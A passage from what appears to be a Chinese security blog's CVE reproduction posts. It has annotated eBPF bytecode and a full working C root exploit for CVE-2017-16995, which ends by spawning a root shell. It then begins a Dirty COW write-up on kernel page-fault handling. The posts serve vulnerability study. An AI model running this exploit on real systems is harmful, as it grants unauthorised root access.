/*BPF_EXIT_INSN(),                                  /*   exit(0);             */39. &quot;\\x79\\x08\\x00\\x00\\x00\\x00\\x00\\x00&quot;  /*BPF_LDX_MEM(BPF_DW, (r8), BPF_REG_0, 0)          /* r_dst = *(u64 *)(r0)   */----------------------------------------------part 6 ----------------------------------------------1. &quot;\\xbf\\x02\\x00\\x00\\x00\\x00\\x00\\x00&quot;  /*BPF_MOV64_REG(BPF_REG_2, BPF_REG_0),               /* r2 = r0    此时r2和r0都指向map中key=2的元素           */2. &quot;\\xb7\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot;  /*BPF_MOV64_IMM(BPF_REG_0, 0),                       /* r0 = 0  for exit(0)   */3. &quot;\\x55\\x06\\x03\\x00\\x00\\x00\\x00\\x00&quot;  /*BPF_JMP_IMM(BPF_JNE, BPF_REG_6, 0, 3),             /* if (op == 0)          */4. &quot;\\x79\\x73\\x00\\x00\\x00\\x00\\x00\\x00&quot;  //BPF_LDX_MEM(BPF_DW, BPF_REG_3, BPF_REG_7, 0), 读取BPF_REG_7地址的内容放到BPF_REG_35. &quot;\\x7b\\x32\\x00\\x00\\x00\\x00\\x00\\x00&quot;  //BPF_STX_MEM(BPF_DW, BPF_REG_2, BPF_REG_3, 0),将BPF_REG_3的内容放入到BPF_REG_26. &quot;\\x95\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot;  //BPF_EXIT_INSN(),7. &quot;\\x55\\x06\\x02\\x00\\x01\\x00\\x00\\x00&quot;  //BPF_JMP_IMM(BPF_JNE, BPF_REG_6, 1, 2),       if(op != 1 )JMP insn+28. &quot;\\x7b\\xa2\\x00\\x00\\x00\\x00\\x00\\x00&quot;  //BPF_STX_MEM(BPF_DW, BPF_REG_2, BPF_REG_10, 0), when op == 1 将rbp寄存器的值即fp指针放到BPF_REG_29. &quot;\\x95\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot;  //BPF_EXIT_INSN(),                                  /*   exit(0);             */10. &quot;\\x7b\\x87\\x00\\x00\\x00\\x00\\x00\\x00&quot;  //BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_8, 0), when op == 2 往BPF_REG_7的地址写入BPF_REG_811. &quot;\\x95\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot;  //BPF_EXIT_INSN(),\n\n综上，exp/* * Ubuntu 16.04.4 kernel priv esc * * all credits to @bleidl * - vnik */// Tested on:// 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64// if different kernel adjust CRED offset + check kernel stack size#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;errno.h&gt;#include &lt;fcntl.h&gt;#include &lt;string.h&gt;#include &lt;linux/bpf.h&gt;#include &lt;linux/unistd.h&gt;#include &lt;sys/mman.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/socket.h&gt;#include &lt;sys/un.h&gt;#include &lt;sys/stat.h&gt;#include &lt;stdint.h&gt;#define PHYS_OFFSET 0xffff880000000000#define CRED_OFFSET 0x9b8 // 0x5f8#define UID_OFFSET 4#define LOG_BUF_SIZE 65536#define PROGSIZE 328 //-32int sockets[2];int mapfd, progfd;char *__prog = &quot;\\xb4\\x09\\x00\\x00\\xff\\xff\\xff\\xff&quot;\t\t\t   &quot;\\x55\\x09\\x02\\x00\\xff\\xff\\xff\\xff&quot;\t\t\t   &quot;\\xb7\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot;\t\t\t   &quot;\\x95\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot;\t\t\t   &quot;\\x18\\x19\\x00\\x00\\x03\\x00\\x00\\x00&quot;\t\t\t   &quot;\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot;\t\t\t   &quot;\\xbf\\x91\\x00\\x00\\x00\\x00\\x00\\x00&quot;\t\t\t   &quot;\\xbf\\xa2\\x00\\x00\\x00\\x00\\x00\\x00&quot;\t\t\t   &quot;\\x07\\x02\\x00\\x00\\xfc\\xff\\xff\\xff&quot;\t\t\t   &quot;\\x62\\x0a\\xfc\\xff\\x00\\x00\\x00\\x00&quot;\t\t\t   &quot;\\x85\\x00\\x00\\x00\\x01\\x00\\x00\\x00&quot;\t\t\t   &quot;\\x55\\x00\\x01\\x00\\x00\\x00\\x00\\x00&quot;\t\t\t   &quot;\\x95\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot;\t\t\t   &quot;\\x79\\x06\\x00\\x00\\x00\\x00\\x00\\x00&quot;\t\t\t   &quot;\\xbf\\x91\\x00\\x00\\x00\\x00\\x00\\x00&quot;\t\t\t   &quot;\\xbf\\xa2\\x00\\x00\\x00\\x00\\x00\\x00&quot;\t\t\t   &quot;\\x07\\x02\\x00\\x00\\xfc\\xff\\xff\\xff&quot;\t\t\t   &quot;\\x62\\x0a\\xfc\\xff\\x01\\x00\\x00\\x00&quot;\t\t\t   &quot;\\x85\\x00\\x00\\x00\\x01\\x00\\x00\\x00&quot;\t\t\t   &quot;\\x55\\x00\\x01\\x00\\x00\\x00\\x00\\x00&quot;\t\t\t   &quot;\\x95\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot;\t\t\t   &quot;\\x79\\x07\\x00\\x00\\x00\\x00\\x00\\x00&quot;\t\t\t   &quot;\\xbf\\x91\\x00\\x00\\x00\\x00\\x00\\x00&quot;\t\t\t   &quot;\\xbf\\xa2\\x00\\x00\\x00\\x00\\x00\\x00&quot;\t\t\t   &quot;\\x07\\x02\\x00\\x00\\xfc\\xff\\xff\\xff&quot;\t\t\t   &quot;\\x62\\x0a\\xfc\\xff\\x02\\x00\\x00\\x00&quot;\t\t\t   &quot;\\x85\\x00\\x00\\x00\\x01\\x00\\x00\\x00&quot;\t\t\t   &quot;\\x55\\x00\\x01\\x00\\x00\\x00\\x00\\x00&quot;\t\t\t   &quot;\\x95\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot;\t\t\t   &quot;\\x79\\x08\\x00\\x00\\x00\\x00\\x00\\x00&quot;\t\t\t   &quot;\\xbf\\x02\\x00\\x00\\x00\\x00\\x00\\x00&quot;\t\t\t   &quot;\\xb7\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot;\t\t\t   &quot;\\x55\\x06\\x03\\x00\\x00\\x00\\x00\\x00&quot;\t\t\t   &quot;\\x79\\x73\\x00\\x00\\x00\\x00\\x00\\x00&quot;\t\t\t   &quot;\\x7b\\x32\\x00\\x00\\x00\\x00\\x00\\x00&quot;\t\t\t   &quot;\\x95\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot;\t\t\t   &quot;\\x55\\x06\\x02\\x00\\x01\\x00\\x00\\x00&quot;\t\t\t   &quot;\\x7b\\xa2\\x00\\x00\\x00\\x00\\x00\\x00&quot;\t\t\t   &quot;\\x95\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot;\t\t\t   &quot;\\x7b\\x87\\x00\\x00\\x00\\x00\\x00\\x00&quot;\t\t\t   &quot;\\x95\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot;;char bpf_log_buf[LOG_BUF_SIZE];static int bpf_prog_load(enum bpf_prog_type prog_type,\t\t\t\t\t\t const struct bpf_insn *insns, int prog_len,\t\t\t\t\t\t const char *license, int kern_version)&#123;\tunion bpf_attr attr = &#123;\t\t.prog_type = prog_type,\t\t.insns = (__u64)insns,\t\t.insn_cnt = prog_len / sizeof(struct bpf_insn),\t\t.license = (__u64)license,\t\t.log_buf = (__u64)bpf_log_buf,\t\t.log_size = LOG_BUF_SIZE,\t\t.log_level = 1,\t&#125;;\tattr.kern_version = kern_version;\tbpf_log_buf[0] = 0;\treturn syscall(__NR_bpf, BPF_PROG_LOAD, &amp;attr, sizeof(attr));&#125;static int bpf_create_map(enum bpf_map_type map_type, int key_size, int value_size,\t\t\t\t\t\t  int max_entries)&#123;\tunion bpf_attr attr = &#123;\t\t.map_type = map_type,\t\t.key_size = key_size,\t\t.value_size = value_size,\t\t.max_entries = max_entries&#125;;\treturn syscall(__NR_bpf, BPF_MAP_CREATE, &amp;attr, sizeof(attr));&#125;static int bpf_update_elem(uint64_t key, uint64_t value)&#123;\tunion bpf_attr attr = &#123;\t\t.map_fd = mapfd,\t\t.key = (__u64)&amp;key,\t\t.value = (__u64)&amp;value,\t\t.flags = 0,\t&#125;;\treturn syscall(__NR_bpf, BPF_MAP_UPDATE_ELEM, &amp;attr, sizeof(attr));&#125;static int bpf_lookup_elem(void *key, void *value)&#123;\tunion bpf_attr attr = &#123;\t\t.map_fd = mapfd,\t\t.key = (__u64)key,\t\t.value = (__u64)value,\t&#125;;\treturn syscall(__NR_bpf, BPF_MAP_LOOKUP_ELEM, &amp;attr, sizeof(attr));&#125;static void __exit(char *err)&#123;\tfprintf(stderr, &quot;error: %s\\n&quot;, err);\texit(-1);&#125;static void prep(void)&#123;\tmapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY, sizeof(int), sizeof(long long), 3);\tif (mapfd &lt; 0)\t\t__exit(strerror(errno));\tputs(&quot;mapfd finished&quot;);\tprogfd = bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER,\t\t\t\t\t\t   (struct bpf_insn *)__prog, PROGSIZE, &quot;GPL&quot;, 0);\tif (progfd &lt; 0)\t\t__exit(strerror(errno));\tputs(&quot;bpf_prog_load finished&quot;);\tif (socketpair(AF_UNIX, SOCK_DGRAM, 0, sockets))\t\t__exit(strerror(errno));\tputs(&quot;socketpair finished&quot;);\tif (setsockopt(sockets[1], SOL_SOCKET, SO_ATTACH_BPF, &amp;progfd, sizeof(progfd)) &lt; 0)\t\t__exit(strerror(errno));\tputs(&quot;setsockopt finished&quot;);&#125;static void writemsg(void)&#123;\tchar buffer[64];\tssize_t n = write(sockets[0], buffer, sizeof(buffer));\tif (n &lt; 0)\t&#123;\t\tperror(&quot;write&quot;);\t\treturn;\t&#125;\tif (n != sizeof(buffer))\t\tfprintf(stderr, &quot;short write: %lu\\n&quot;, n);&#125;#define __update_elem(a, b, c) \\\tbpf_update_elem(0, (a));   \\\tbpf_update_elem(1, (b));   \\\tbpf_update_elem(2, (c));   \\\twritemsg();static uint64_t get_value(int key)&#123;\tuint64_t value;\tif (bpf_lookup_elem(&amp;key, &amp;value))\t\t__exit(strerror(errno));\treturn value;&#125;static uint64_t __get_fp(void)&#123;\t__update_elem(1, 0, 0);\treturn get_value(2);&#125;static uint64_t __read(uint64_t addr)&#123;\t__update_elem(0, addr, 0);\treturn get_value(2);&#125;static void __write(uint64_t addr, uint64_t val)&#123;\t__update_elem(2, addr, val);&#125;static uint64_t get_sp(uint64_t addr)&#123;\treturn addr &amp; ~(0x4000 - 1);&#125;static void pwn(void)&#123;\tuint64_t fp, sp, task_struct, credptr, uidptr;\tfp = __get_fp();\tif (fp &lt; PHYS_OFFSET)\t\t__exit(&quot;bogus fp&quot;);\tsp = get_sp(fp);\tif (sp &lt; PHYS_OFFSET)\t\t__exit(&quot;bogus sp&quot;);\ttask_struct = __read(sp);\tif (task_struct &lt; PHYS_OFFSET)\t\t__exit(&quot;bogus task ptr&quot;);\tprintf(&quot;task_struct = %lx\\n&quot;, task_struct);\tcredptr = __read(task_struct + CRED_OFFSET); // cred\tif (credptr &lt; PHYS_OFFSET)\t\t__exit(&quot;bogus cred ptr&quot;);\tuidptr = credptr + UID_OFFSET; // uid\tif (uidptr &lt; PHYS_OFFSET)\t\t__exit(&quot;bogus uid ptr&quot;);\tprintf(&quot;uidptr = %lx\\n&quot;, uidptr);\t__write(uidptr, 0); // set both uid and gid to 0\tif (getuid() == 0)\t&#123;\t\tprintf(&quot;spawning root shell\\n&quot;);\t\tsystem(&quot;id&quot;);\t\tsystem(&quot;/bin/sh&quot;);\t\texit(0);\t&#125;\t__exit(&quot;not vulnerable?&quot;);&#125;int main(int argc, char **argv)&#123;\tprep();\tpwn();\treturn 0;&#125;\n\n\n这里exp我是直接用的原文的exp，因为理解漏洞之后操作起来就比较简单了，主要麻烦的就是构造eBPF指令\n\n题目放在:https://github.com/196082/196082\n参考文章:http://p4nda.top/2019/01/18/CVE-2017-16995/#do-check\n","categories":["Linux Kernel","CVE复现"],"tags":["ebpf"]},{"title":"CVE-2016-5195复现","url":"/2023/08/08/CVE-2016-5195/","content":"前言CVE-2016-5195就是非常出名的Dirty COW，俗称脏牛漏洞。攻击者可以通过Linux Kernel中的COW ( copy-on-write )机制利用条件竞争实现越权对文件读写。\n此漏洞自从Linux Kernel 2.6.22版本就存在，直到2018年Linux Kernel 4.8.3, 4.7.9, 4.4.26版本才被修复。其实这一个CVE应当是一个初学者复现的第一个CVE的，但是可笑的是我是知道今年四五月份时阿里实习生二面的时候才听说过，所以被狠狠的刷了。然而作为一条懒狗我也是硬拖到现在才进行复现，然而在之前我尝试过复现一次不过因为电脑性能跑不出poc就放弃了，因为最近又要开始各种面试所以又要开始学习很多东西了。\nCOW机制basic COWCOW 即 copy on write：目的是为了降低系统的开销，在一个进程通过fork()创建一个子进程时，并不会直接将父进程的所有地址空间的所有内容复制再分配给子进程。而实际的机制为父进程与子进程共享所有的页框，而不是直接给子进程分配新的页框，只有当其中任意一方尝试向页框写入内容时内核才会为其分配页框，并将原本内框的内容复制过去。\n\n  在fork()系统调用后，父子进程会共享所有的页框，内核将所有的页框定义为read-only。\n  由于所有页框都是只读的权限，当其中任意一方尝试修改页框时便会触发缺页异常，此时内核会为其分配新的页框。\n\n\n\n\n以上就是写时复制的基本流程，大大的减少了系统的开销。\nmmap 与 COW在上文中想必各位都看到了一个非常熟悉的词缺页异常，其实在原先的文章中我们已经遇到过了缺页异常也是常用的userfaultfd机制。然而当时我们创建的是PROT_READ|PROT_WRITE，当我们映射一个只有读权限的文件，若是我们此时向映射中写入内容时同样会触发写时复制的机制，将文件内容拷贝到内存中，此时进程对这块区域的读写便不会影响磁盘中的文件了。\n缺页异常&amp;write在以前写过的userfaultfd这一利用方法的时候并没有分析过缺页异常的原理更别提源码分析了，所以这次正好写一下。\n在CPU中使用MMU进行虚拟内存和物理内存之间的映射，然而在系统中并不是所有的虚拟内存页面都有对应的物理内存页，当软件试图访问已经被映射在虚拟内存中，但是并没有被加载到物理内存中的一个分页时，MMU无法完成由虚拟内存到物理内存之间的转化，此时便会产生缺页异常。\n分类那么触发缺页异常主要有以下三种情况：\n\n  线性地址不在虚拟地址空间中\n  线性地址在虚拟地址空间中，但是权限不够\n  线性地址在虚拟地址空间中，但是没有与物理地址之间建立映射\n\n其类型主要分为以下三种：\n\n软性缺页异常\n  软性缺页异常指的是相关页已经被载入到了内存中，但是并没有在MMU中注册，此时只需要向MMU注册相关的物理页即可。\n  主要出现在以下两种情况：\n\n  两个进程共享相同的物理页框，内核为其中一个注册了物理页，但是没有为另外一个注册\n  该页已经被CPU的工作集中移除，但是尚未交换到磁盘上，若是程序重新使用该页则另需向MMU注册\n\n\n硬性缺页异常\n  硬性缺页异常则意味着使用的页并没有被载入到内存中，此时操作系统则需要讲一个合适并且空闲的物理页载入进内存中，随后向该页中写入内容，并在MMU中注册。硬性缺页异常的开销极大，因此部分操作系统也会采取延迟页载入的策略——只有到万不得已时才会分配新的物理页，这也是 Linux 内核的做法。若是频繁地发生硬性缺页异常则会引发系统颠簸，因资源耗尽而无法正常完成工作。\n\n无效缺页异常\n  意味着进程访问了一个无效的内存地址，此时kernel会向进程发送SIGSEGV信号。\n\n\n处理缺页异常针对文本的缺页异常处理的流程如下：\n__do_page_fault() =&gt; __handle_mm_fault() =&gt; handle_pte_fault() =&gt; do_fault() =&gt; do_read_fault()/do_ww_fault()/do_shared_fault()\n\n从头往后看，首先看__do_page_fault函数。\n__do_page_faultstatic noinline void__do_page_fault(struct pt_regs *regs, unsigned long error_code,\t\tunsigned long address)&#123;\tstruct vm_area_struct *vma;\tstruct task_struct *tsk;\tstruct mm_struct *mm;\tint fault, major = 0;\tunsigned int flags = FAULT_FLAG_ALLOW_RETRY | FAULT_FLAG_KILLABLE;\ttsk = current;\tmm = tsk-&gt;mm;\t/*\t * Detect and handle instructions that would cause a page fault for\t * both a tracked kernel page and a userspace page.\t */\tif (kmemcheck_active(regs))\t\tkmemcheck_hide(regs);\tprefetchw(&amp;mm-&gt;mmap_sem);\tif (unlikely(kmmio_fault(regs, address)))\t\treturn;\t/*\t * We fault-in kernel-space virtual memory on-demand. The\t * &#x27;reference&#x27; page table is init_mm.pgd.\t *\t * NOTE! We MUST NOT take any locks for this case. We may\t * be in an interrupt or a critical region, and should\t * only copy the information from the master page table,\t * nothing more.\t *\t * This verifies that the fault happens in kernel space\t * (error_code &amp; 4) == 0, and that the fault was not a\t * protection error (error_code &amp; 9) == 0.\t */\tif (unlikely(fault_in_kernel_space(address))) &#123;\t\tif (!(error_code &amp; (PF_RSVD | PF_USER | PF_PROT))) &#123;\t\t\tif (vmalloc_fault(address) &gt;= 0)\t\t\t\treturn;\t\t\tif (kmemcheck_fault(regs, address, error_code))\t\t\t\treturn;\t\t&#125;\t\t/* Can handle a stale RO-&gt;RW TLB: */\t\tif (spurious_fault(error_code, address))\t\t\treturn;\t\t/* kprobes don&#x27;t want to hook the spurious faults: */\t\tif (kprobes_fault(regs))\t\t\treturn;\t\t/*\t\t * Don&#x27;t take the mm semaphore here. If we fixup a prefetch\t\t * fault we could otherwise deadlock:\t\t */\t\tbad_area_nosemaphore(regs, error_code, address);\t\treturn;\t&#125;\t/* kprobes don&#x27;t want to hook the spurious faults: */\tif (unlikely(kprobes_fault(regs)))\t\treturn;\tif (unlikely(error_code &amp; PF_RSVD))\t\tpgtable_bad(regs, error_code, address);\tif (unlikely(smap_violation(error_code, regs))) &#123;\t\tbad_area_nosemaphore(regs, error_code, address);\t\treturn;\t&#125;\t/*\t * If we&#x27;re in an interrupt, have no user context or are running\t * in a region with pagefaults disabled then we must not take the fault\t */\tif (unlikely(faulthandler_disabled() || !mm)) &#123;\t\tbad_area_nosemaphore(regs, error_code, address);\t\treturn;\t&#125;\t/*\t * It&#x27;s safe to allow irq&#x27;s after cr2 has been saved and the\t * vmalloc fault has been handled.\t *\t * User-mode registers count as a user access even for any\t * potential system fault or CPU buglet:\t */\tif (user_mode(regs)) &#123;\t\tlocal_irq_enable();\t\terror_code |= PF_USER;\t\tflags |= FAULT_FLAG_USER;\t&#125; else &#123;\t\tif (regs-&gt;flags &amp; X86_EFLAGS_IF)\t\t\tlocal_irq_enable();\t&#125;\tperf_sw_event(PERF_COUNT_SW_PAGE_FAULTS, 1, regs, address);\tif (error_code &amp; PF_WRITE)\t\tflags |= FAULT_FLAG_WRITE;\t/*\t * When running in the kernel we expect faults to occur only to\t * addresses in user space.  All other faults represent errors in\t * the kernel and should generate an OOPS.  Unfortunately, in the\t * case of an erroneous fault occurring in a code path which already\t * holds mmap_sem we will deadlock attempting to validate the fault\t * against the address space.  Luckily the kernel only validly\t * references user space from well defined areas of code, which are\t * listed in the exceptions table.\t *\t * As the vast majority of faults will be valid we will only perform\t * the source reference check when there is a possibility of a\t * deadlock. Attempt to lock the address space, if we cannot we then\t * validate the source. If this is invalid we can skip the address\t * space check, thus avoiding the deadlock:\t */\tif (unlikely(!down_read_trylock(&amp;mm-&gt;mmap_sem))) &#123;\t\tif ((error_code &amp; PF_USER) == 0 &amp;&amp;\t\t    !search_exception_tables(regs-&gt;ip)) &#123;\t\t\tbad_area_nosemaphore(regs, error_code, address);\t\t\treturn;\t\t&#125;retry:\t\tdown_read(&amp;mm-&gt;mmap_sem);\t&#125; else &#123;\t\t/*\t\t * The above down_read_trylock() might have succeeded in\t\t * which case we&#x27;ll have missed the might_sleep() from\t\t * down_read():\t\t */\t\tmight_sleep();\t&#125;\tvma = find_vma(mm, address);\tif (unlikely(!vma)) &#123;\t\tbad_area(regs, error_code, address);\t\treturn;\t&#125;\tif (likely(vma-&gt;vm_start &lt;= address))\t\tgoto good_area;\tif (unlikely(!(vma-&gt;vm_flags &amp; VM_GROWSDOWN))) &#123;\t\tbad_area(regs, error_code, address);\t\treturn;\t&#125;\tif (error_code &amp; PF_USER) &#123;\t\t/*\t\t * Accessing the stack below %sp is always a bug.\t\t * The large cushion allows instructions like enter\t\t * and pusha to work. (&quot;enter $65535, $31&quot; pushes\t\t * 32 pointers and then decrements %sp by 65535.)\t\t */\t\tif (unlikely(address + 65536 + 32 * sizeof(unsigned long) &lt; regs-&gt;sp)) &#123;\t\t\tbad_area(regs, error_code, address);\t\t\treturn;\t\t&#125;\t&#125;\tif (unlikely(expand_stack(vma, address))) &#123;\t\tbad_area(regs, error_code, address);\t\treturn;\t&#125;\t/*\t * Ok, we have a good vm_area for this memory access, so\t * we can handle it..\t */good_area:\tif (unlikely(access_error(error_code, vma))) &#123;\t\tbad_area_access_error(regs, error_code, address);\t\treturn;\t&#125;\t/*\t * If for any reason at all we couldn&#x27;t handle the fault,\t * make sure we exit gracefully rather than endlessly redo\t * the fault.  Since we never set FAULT_FLAG_RETRY_NOWAIT, if\t * we get VM_FAULT_RETRY back, the mmap_sem has been unlocked.\t */\tfault = handle_mm_fault(mm, vma, address, flags);\tmajor |= fault &amp; VM_FAULT_MAJOR;\t/*\t * If we need to retry the mmap_sem has already been released,\t * and if there is a fatal signal pending there is no guarantee\t * that we made any progress. Handle this case first.\t */\tif (unlikely(fault &amp; VM_FAULT_RETRY)) &#123;\t\t/* Retry at most once */\t\tif (flags &amp; FAULT_FLAG_ALLOW_RETRY) &#123;\t\t\tflags &amp;= ~FAULT_FLAG_ALLOW_RETRY;\t\t\tflags |= FAULT_FLAG_TRIED;\t\t\tif (!fatal_signal_pending(tsk))\t\t\t\tgoto retry;\t\t&#125;\t\t/* User mode? Just return to handle the fatal exception */\t\tif (flags &amp; FAULT_FLAG_USER)\t\t\treturn;\t\t/* Not returning to user mode? Handle exceptions or die: */\t\tno_context(regs, error_code, address, SIGBUS, BUS_ADRERR);\t\treturn;\t&#125;\tup_read(&amp;mm-&gt;mmap_sem);\tif (unlikely(fault &amp; VM_FAULT_ERROR)) &#123;\t\tmm_fault_error(regs, error_code, address, fault);\t\treturn;\t&#125;\t/*\t * Major/minor page fault accounting. If any of the events\t * returned VM_FAULT_MAJOR, we account it as a major fault.\t */\tif (major) &#123;\t\ttsk-&gt;maj_flt++;\t\tperf_sw_event(PERF_COUNT_SW_PAGE_FAULTS_MAJ, 1, regs, address);\t&#125; else &#123;\t\ttsk-&gt;min_flt++;\t\tperf_sw_event(PERF_COUNT_SW_PAGE_FAULTS_MIN, 1, regs, address);\t&#125;\tcheck_v8086_mode(regs, address, tsk);&#125;NOKPROBE_SYMBOL(__do_page_fault);\n\n首先需要知道的是vma表示的是线性区描述符，tsk表示的是很熟悉的task_struct,mm也是前面文章中提到过的mm_struct。\nunsigned int flags = FAULT_FLAG_ALLOW_RETRY | FAULT_FLAG_KILLABLE;\n\n首先通过这样一条语句初始化flags，随后初始化上述的变量。\nif (unlikely(fault_in_kernel_space(address))) &#123;  if (!(error_code &amp; (PF_RSVD | PF_USER | PF_PROT)))&#123;\n\n通过这条语句以及验证error_code判断缺页异常是否发生在内核空间，而PF_RSVD | PF_USER | PF_PROT的含义分别表示页表项保留 ｜ 用户页异常 ｜ 页保护异常。如果判断结果认定为内核地址空间发生的缺页则使用vmalloc_fault(address)进行处理。\n随后还是主要分析用户态的缺页异常。\nif (unlikely(error_code &amp; PF_RSVD))\t\tpgtable_bad(regs, error_code, address);\n\n如果使用了页表项保留的标识位则代表是页表错误并进行处理。\nif (unlikely(smap_violation(error_code, regs))) &#123;  bad_area_nosemaphore(regs, error_code, address);  return;&#125;\n\n这一步则是验证是否出发了smap保护，如果是则直接杀死进程。\nif (unlikely(faulthandler_disabled() || !mm)) &#123;  bad_area_nosemaphore(regs, error_code, address);  return;&#125;\n\n这里验证了时候开启了缺页不处理或者是不存在用户空间。\nif (user_mode(regs)) &#123;  local_irq_enable();  error_code |= PF_USER;  flags |= FAULT_FLAG_USER;&#125; else &#123;  if (regs-&gt;flags &amp; X86_EFLAGS_IF)    local_irq_enable();&#125;\n\n判断寄存器发生缺页时是否为用户态寄存器，紧接着发送终端请求，然后设置error_code和flags为用户空间发生的缺页。\nif (error_code &amp; PF_WRITE)  flags |= FAULT_FLAG_WRITE;\n\n判断是否是在写的时候发生的，如果是的话则给flags添加相应的标识位。\nif (unlikely(!down_read_trylock(&amp;mm-&gt;mmap_sem))) &#123;\t\tif ((error_code &amp; PF_USER) == 0 &amp;&amp; \t\t    !search_exception_tables(regs-&gt;ip)) &#123;\t\t\tbad_area_nosemaphore(regs, error_code, address);\t\t\treturn;\t\t&#125;retry:\t\tdown_read(&amp;mm-&gt;mmap_sem);\t&#125; else &#123;\t\tmight_sleep();\t&#125;\n\n随后对mm_struct上锁，如果上锁失败并且发现是内核空间的异常则杀死进程，成功则继续。\nvma = find_vma(mm, address);if (unlikely(!vma)) &#123;  bad_area(regs, error_code, address);  return;&#125;if (likely(vma-&gt;vm_start &lt;= address))  goto good_area;if (unlikely(!(vma-&gt;vm_flags &amp; VM_GROWSDOWN))) &#123;  bad_area(regs, error_code, address);  return;&#125;if (error_code &amp; PF_USER) &#123;  if (unlikely(address + 65536 + 32 * sizeof(unsigned long) &lt; regs-&gt;sp)) &#123;    bad_area(regs, error_code, address);    return;  &#125;&#125;if (unlikely(expand_stack(vma, address))) &#123;  bad_area(regs, error_code, address);  return;&#125;\n\n在这里则是搜线搜索到地址对应的vma，如果vma不存在则杀死进程。如果使用的线性地址大于vma-&gt;vm_start则进入good_area。如果不是则进入下一个if，判断当前的vma是否为堆栈区，如果不是则直接杀死进程。紧接着验证是否为用户空间的缺页，如果是则紧接着是对栈的一个判断。后续则是增长线性区，如果失败也杀死进程。\ngood_area:\tif (unlikely(access_error(error_code, vma))) &#123;\t\tbad_area_access_error(regs, error_code, address);\t\treturn;\t&#125;\tfault = handle_mm_fault(mm, vma, address, flags);\tmajor |= fault &amp; VM_FAULT_MAJOR;\n\n运行到这里先是判断一下error_code与vma是否冲突，如果不冲突则进入分配物理页的核心函数handle_mm_fault。\nif (unlikely(fault &amp; VM_FAULT_RETRY)) &#123;  if (flags &amp; FAULT_FLAG_ALLOW_RETRY) &#123;    flags &amp;= ~FAULT_FLAG_ALLOW_RETRY;    flags |= FAULT_FLAG_TRIED;    if (!fatal_signal_pending(tsk))      goto retry;  &#125;  if (flags &amp; FAULT_FLAG_USER)    return;  no_context(regs, error_code, address, SIGBUS, BUS_ADRERR);  return;&#125;\n\n这里判断是否需要充实，如果需要重试，那么进一步判断在开始初始化的flags中是否包含标志位FAULT_FLAG_ALLOW_RETRY，如果有的话则进行充实，并且擦出掉flags中的允许充实标识为，并且添加FAULT_FLAG_TRIED标志位。\nhandle_mm_fault这个函数的中的真正处理函数其实是__handle_mm_fault，所以直接看其中的这个函数吧。\nstatic int __handle_mm_fault(struct mm_struct *mm, struct vm_area_struct *vma,\t\t\t     unsigned long address, unsigned int flags)&#123;\tpgd_t *pgd;\tpud_t *pud;\tpmd_t *pmd;\tpte_t *pte;\tif (unlikely(is_vm_hugetlb_page(vma)))\t\treturn hugetlb_fault(mm, vma, address, flags);\tpgd = pgd_offset(mm, address);\tpud = pud_alloc(mm, pgd, address);\tif (!pud)\t\treturn VM_FAULT_OOM;\tpmd = pmd_alloc(mm, pud, address);\tif (!pmd)\t\treturn VM_FAULT_OOM;\tif (pmd_none(*pmd) &amp;&amp; transparent_hugepage_enabled(vma)) &#123;\t\tint ret = create_huge_pmd(mm, vma, address, pmd, flags);\t\tif (!(ret &amp; VM_FAULT_FALLBACK))\t\t\treturn ret;\t&#125; else &#123;\t\tpmd_t orig_pmd = *pmd;\t\tint ret;\t\tbarrier();\t\tif (pmd_trans_huge(orig_pmd)) &#123;\t\t\tunsigned int dirty = flags &amp; FAULT_FLAG_WRITE;\t\t\t/*\t\t\t * If the pmd is splitting, return and retry the\t\t\t * the fault.  Alternative: wait until the split\t\t\t * is done, and goto retry.\t\t\t */\t\t\tif (pmd_trans_splitting(orig_pmd))\t\t\t\treturn 0;\t\t\tif (pmd_protnone(orig_pmd))\t\t\t\treturn do_huge_pmd_numa_page(mm, vma, address,\t\t\t\t\t\t\t     orig_pmd, pmd);\t\t\tif (dirty &amp;&amp; !pmd_write(orig_pmd)) &#123;\t\t\t\tret = wp_huge_pmd(mm, vma, address, pmd,\t\t\t\t\t\t\torig_pmd, flags);\t\t\t\tif (!(ret &amp; VM_FAULT_FALLBACK))\t\t\t\t\treturn ret;\t\t\t&#125; else &#123;\t\t\t\thuge_pmd_set_accessed(mm, vma, address, pmd,\t\t\t\t\t\t      orig_pmd, dirty);\t\t\t\treturn 0;\t\t\t&#125;\t\t&#125;\t&#125;\t/*\t * Use __pte_alloc instead of pte_alloc_map, because we can&#x27;t\t * run pte_offset_map on the pmd, if an huge pmd could\t * materialize from under us from a different thread.\t */\tif (unlikely(pmd_none(*pmd)) &amp;&amp;\t    unlikely(__pte_alloc(mm, vma, pmd, address)))\t\treturn VM_FAULT_OOM;\t/* if an huge pmd materialized from under us just retry later */\tif (unlikely(pmd_trans_huge(*pmd)))\t\treturn 0;\t/*\t * A regular pmd is established and it can&#x27;t morph into a huge pmd\t * from under us anymore at this point because we hold the mmap_sem\t * read mode and khugepaged takes it in write mode. So now it&#x27;s\t * safe to run pte_offset_map().\t */\tpte = pte_offset_map(pmd, address);\treturn handle_pte_fault(mm, vma, address, pte, pmd, flags);&#125;\n\n相信看过我前面那篇文章的都不会陌生pgd | pud | pmd | pte这四个页表，他们分表表示的是页全局目录｜页上级目录｜页中间目录｜页表项，这个函数中首先则是通过mm获取到pgd页全局目录，随后生成pud和pmd并为pmd创建中间项，在最后货渠道pte并进入到处理函数handle_pte_fault中。\nhandle_pte_faultstatic int handle_pte_fault(struct 